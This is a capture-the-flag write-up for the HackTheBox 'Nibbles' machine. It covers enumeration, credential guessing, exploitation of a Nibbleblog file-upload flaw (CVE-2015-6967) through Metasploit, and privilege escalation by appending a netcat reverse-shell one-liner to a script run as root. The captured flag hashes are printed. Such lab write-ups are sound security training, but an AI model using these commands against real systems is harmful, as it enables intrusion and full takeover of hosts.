# HTB – Nibbles

## Machine Information

| Field | Value |
|------|------|
| Name | Nibbles |
| Platform | HackTheBox |
| Difficulty | Easy |
| OS | Linux |
| Web App | Nibbleblog |
| Vulnerability | File Upload |
| CVE | CVE-2015-6967 |

---

# Enumeration

## Services

We start with an Nmap scan.

```bash
nmap -sC -sV STMIP
```

* 22 **SSH** OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
* 80 **HTTP** Apache/2.4.18

![nmap scan](images/nmap.png)

---

# Web Enumeration

The website only shows a basic page.

```
http://10.129.20.39
```

![web page](images/helloworld.png)

Looking at the source code reveals a hidden directory.

![source code](images/sourcecode.png)

Interesting path discovered:

```
/nibbleblog
```

![nibbleblog](images/nibbleblog.png)

---

# Directory Enumeration

We use **ffuf** for directory fuzzing.

```bash
ffuf -u http://10.129.20.39/nibbleblog/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-mc all -fc 404
```

Results:

```
.htpasswd  [Status: 403]
admin      [Status: 301]
admin.php  [Status: 200]
content    [Status: 301]
index.php  [Status: 200]
languages  [Status: 301]
plugins    [Status: 301]
README     [Status: 200]
themes     [Status: 301]
```

---

# Version Discovery

We retrieve the README file.

```bash
curl http://10.129.20.39/nibbleblog/README
```

```
====== Nibbleblog ======
Version: v4.0.3
Release date: 2014-04-01
```

---

# Credential Discovery

Configuration file:

```
/nibbleblog/content/private/config.xml
```

```bash
curl http://10.129.20.39/nibbleblog/content/private/config.xml
```

We discover a possible username:

```
admin@nibbles.com
```

Testing credentials:

```
admin : nibbles
```

Login successful.

![dashboard](images/dashboard.png)

---

# Exploitation

Nibbleblog 4.0.3 is vulnerable to **CVE-2015-6967**.

Metasploit module:

```bash
search nibble
use exploit/multi/http/nibbleblog_file_upload
```

Configuration:

```
RHOSTS 10.129.20.39
USERNAME admin
PASSWORD nibbles
TARGETURI /nibbleblog
LHOST 10.10.14.249
LPORT 4444
```

Execute:

```bash
run
```

Meterpreter session obtained.

---

# Shell Stabilization

Spawn a shell:

```bash
shell
```

Spawn TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Check user:

```bash
id
```

```
uid=1001(nibbler)
```

---

# User Flag

```bash
cd /home/nibbler
ls
```

```
personal.zip
user.txt
```

```bash
cat user.txt
```

```
79c03865431abf47b90ef24b9695e148
```

---

# Privilege Escalation

Inside the extracted files we find `monitor.sh`.

Append reverse shell:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.249 8443 >/tmp/f' >> monitor.sh
```

Start listener:

```bash
nc -lvnp 8443
```

Execute script → root shell obtained.

```bash
id
```

```
uid=0(root)
```

---

# Root Flag

```bash
cd /root
ls
```

```
root.txt
```

```bash
cat root.txt
```

```
de5e5d6619862a8aa5b9b212314e0cdd
```

---

# Summary

This machine demonstrated a full **web exploitation chain**:

1. Enumeration with **Nmap**
2. Web discovery using **ffuf**
3. Version discovery via README
4. Credential discovery from configuration
5. Exploitation of **CVE-2015-6967**
6. Shell access through file upload vulnerability
7. Privilege escalation using writable script

The box highlights common security issues:

* outdated CMS software
* exposed configuration files
* unsafe file upload functionality
* improperly secured scripts with elevated privileges
